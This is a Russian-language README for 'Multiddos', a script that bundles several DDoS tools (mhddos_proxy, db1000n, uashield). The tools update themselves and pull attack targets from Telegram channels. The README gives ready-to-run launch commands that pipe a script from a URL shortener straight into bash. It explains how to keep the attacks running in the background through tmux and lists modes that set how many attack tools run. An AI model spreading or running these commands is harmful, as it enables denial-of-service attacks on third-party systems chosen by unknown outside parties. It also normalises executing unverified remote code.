## Multiddos - скрипт объединяющий в себе несколько утилит для ddos
Идея скрипта заключается в том, чтобы автоматизировать сразу несколько утилит, объединить несколько групп в более массированные атаки, а также не давать простаивать свободным ресурсам на VPS.

![multiddos](https://user-images.githubusercontent.com/53382906/161972523-a1197762-a166-45f2-9b68-6e13cc940d99.gif)

На данный момент скрипт поддерживает:
* [Multiddos](https://github.com/KarboDuck/multiddos) (ранее известный как auto_bash) от Украинского Жнеца ([канал](https://t.me/ukrainian_reaper_ddos), [чат](https://t.me/+azRzzKp-STpkMjNi))
* [db1000n ](https://github.com/Arriven/db1000n) от IT ARMY of Ukraine ([канал](https://t.me/itarmyofukraine2022), чат)
* [UA Cyber SHIELD](https://github.com/opengs/uashield) ([канал](https://t.me/uashield), чат) 

Все утилиты автоматизированы, то есть автоматически обновляются при запуске и автоматически подтягивают новые цели из своих каналов.

## Команда для запуска в Linux

Рекомендуется использовать именно этот метод
```
curl -L tiny.one/multiddos | bash && tmux a
```

Скрипт запускает tmux сессию. Если закрыть терминал или оборвать ssh сессию, то программы не закроются, а будут дальше работать в фоне. После повторного подключения к сессии Tmux все программы снова появятся на экране.

Внутри окна Multiddos запускается утилита для мониторинга gotop (можно смотреть за исходящим трафиком, нагрузкой на процессор, и использованием RAM) и утилиты, перечисленные выше. 

## Выбор режима

В программе доступно 3 основных режима. -m1, -m2, -m3, по количеству запускаемых утилит.

* `-m1` запускает только  Multiddos (обвертка для mhddos_proxy от Украинского жнеца)

```
curl -L tiny.one/multiddos -o mul.ti && bash mul.ti -m1 && tmux a
```

* `-m2` запускает Multiddos + db1000n (этот режим используется по умолчанию)
```
curl -L tiny.one/multiddos -o mul.ti && bash mul.ti -m2 && tmux a
```
* `-m3` запускает Multiddos + db1000n + uashield (на данный момент не рекомендуется, так как эффективность uashield не ясна, и он дублирует атаки по тем же целям, что и утилиты выше)

```
curl -L tiny.one/multiddos -o mul.ti && bash mul.ti -m3 && tmux a
```
* `--matrix` режим матрицы (эффект матрицы в небольшом окне). Был добавлен в режиме тестирования, позже решили оставить как опцию.

```
curl -L tiny.one/multiddos -o mul.ti && bash mul.ti --matrix && tmux a
```

## Запуск в фоне

Для того, чтобы запустить Multiddos в фоне достаточно просто убрать в конце команды вызов Tmux.

```
curl -L tiny.one/multiddos | bash
```
Чтобы подключиться к сессии tmux (вывести программы на экран) прочитайте ниже пункт **Переподключиться к сессии Tmux**.


## Управление Tmux

* **Свернуть Tmux**. Программы продолжат работать в фоне, и к сессии можно будет снова подключиться. `Нажмите Ctrl+b` отпустите `Нажмите d`
* **Закрыть сессию Tmux**. Сначала выйдите из Tmux: `Нажмите Ctrl+b` отпустите `Нажмите d`. Выполните в терминале команду `tmux kill-session -t multiddos`
* **Переподключиться к сессии Tmux**. Если у вас всего одна сессия Tmux, то используйте: `tmux a` (tmux attach). Если у вас несколько сессий, подключайтесь по имени: `tmux attach-session -t multiddos`

## Закрыть все программы
Поскольку программы продолжат работать в фоне после закрытия терминала, закрывать их нужно другими способами.

1. В другом терминале выполнить команду:
```
pkill tmux; pkill node; pkill shield; pkill -f start.py; pkill -f runner.py
```

2. Или при желании просто перезагрузить компьютер/виртуалку.